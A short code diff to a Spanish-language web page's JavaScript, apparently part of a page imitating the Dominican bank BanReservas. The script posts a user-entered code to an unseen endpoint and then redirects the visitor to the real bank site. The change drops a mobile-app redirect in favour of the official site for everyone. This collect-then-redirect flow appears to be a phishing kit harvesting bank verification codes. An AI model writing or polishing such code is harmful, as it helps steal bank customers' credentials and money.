@@ -115,19 +115,12 @@
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ code }),
+                body: JSON.stringify({ code } ),
             });
 
             if (response.ok) {
-                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-
-                if (isMobile) {
-                    // Redirigir a la aplicación móvil de BanReservas
-                    window.location.href = 'banreservas://';
-                } else {
-                    // Redirigir a la página oficial de BanReservas
-                    window.location.href = 'https://www.banreservas.com/';
-                }
+                // Redirigir a la página oficial de BanReservas para todos
+                window.location.href = 'https://www.banreservas.com/';
             } else {
                 alert('Error al enviar el código. Por favor, inténtelo de nuevo.');
             }
